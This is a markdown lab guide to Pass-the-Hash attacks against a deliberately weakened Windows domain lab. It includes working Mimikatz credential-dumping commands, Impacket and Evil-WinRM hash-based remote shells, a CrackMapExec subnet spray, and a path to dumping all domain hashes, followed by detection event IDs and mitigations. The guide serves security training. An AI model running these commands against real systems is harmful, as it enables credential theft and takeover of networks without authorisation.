# Pass-the-Hash (PTH)

## Overview

Pass-the-Hash abuses NTLM authentication: instead of supplying a plaintext password, you supply the **NTLM hash directly**. Windows NTLM authentication accepts the hash as the credential — no cracking required.

## Lab Misconfiguration Enabled

`Setup-ExtraAttacks.ps1` sets:

```
LocalAccountTokenFilterPolicy = 1
```

This disables UAC remote token filtering, allowing **local administrator accounts** to authenticate over the network with their full token (not a filtered, non-admin token).

## Prerequisites

- NTLM hash of a local Administrator or domain account
- Target machine reachable on port 445 (SMB) or 5985 (WinRM)
- Windows Firewall disabled (done by `Setup-ExtraAttacks.ps1`)

## Step 1 — Obtain NTLM Hash

### From Mimikatz (on a compromised machine)

```
# Dump all credentials from LSASS
privilege::debug
sekurlsa::logonpasswords

# Example output:
#   Username : Administrator
#   NTLM     : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### From WDigest (cleartext — enabled by Setup-ExtraAttacks.ps1)

```
sekurlsa::wdigest
# Returns cleartext password directly
```

### From SAM (local accounts)

```
# On DC-01 or WS-01
lsadump::sam
```

## Step 2 — Pass the Hash

### SMB / Remote Command Execution (Impacket)

```bash
# List shares
smbclient.py corp.local/Administrator@192.168.56.20 \
  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Remote shell
psexec.py corp.local/Administrator@192.168.56.20 \
  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# WMI exec
wmiexec.py corp.local/Administrator@192.168.56.20 \
  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### WinRM (Evil-WinRM)

```bash
evil-winrm -i 192.168.56.10 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c
```

### Mimikatz PTH (Windows → spawn a shell)

```
sekurlsa::pth \
  /user:Administrator \
  /domain:corp.local \
  /ntlm:8846f7eaee8fb117ad06bdd830b7586c \
  /run:cmd.exe
```

This spawns a new cmd.exe process with the impersonated identity.

### CrackMapExec — Spray to find where hash works

```bash
crackmapexec smb 192.168.56.0/24 \
  -u Administrator \
  -H 8846f7eaee8fb117ad06bdd830b7586c \
  --local-auth
```

`(Pwn3d!)` next to a host means LocalAccountTokenFilterPolicy is 1 and you have a shell.

## Lab Attack Path

```
WS-01 (attacker.01)
  |
  |-- Dump local SAM of WS-01 → local Administrator hash
  |-- PTH → DC-01 (LocalAccountTokenFilterPolicy = 1)
  |-- Full access as Administrator
  |-- Dump NTDS.dit → all domain hashes
```

## Why It Works in This Lab

| Setting | Value | Effect |
|---------|-------|--------|
| `LocalAccountTokenFilterPolicy` | 1 | Local admin token not filtered over network |
| Windows Firewall | Disabled | SMB/WinRM accessible from any host |
| WDigest | Enabled | Cleartext passwords also available in LSASS |

## Detection

| Indicator | Event ID |
|-----------|----------|
| NTLM authentication (not Kerberos) | 4624 (LogonType 3, AuthPackage NTLM) |
| Access to admin shares (C$, ADMIN$) | 5140 |
| PsExec service creation | 7045 |

## Mitigations (Disabled in This Lab)

- Set `LocalAccountTokenFilterPolicy = 0` (default on modern Windows)
- Disable NTLM entirely (Kerberos-only)
- Enable Credential Guard (prevents hash extraction from LSASS)
- Use LAPS — randomizes local Administrator password per machine
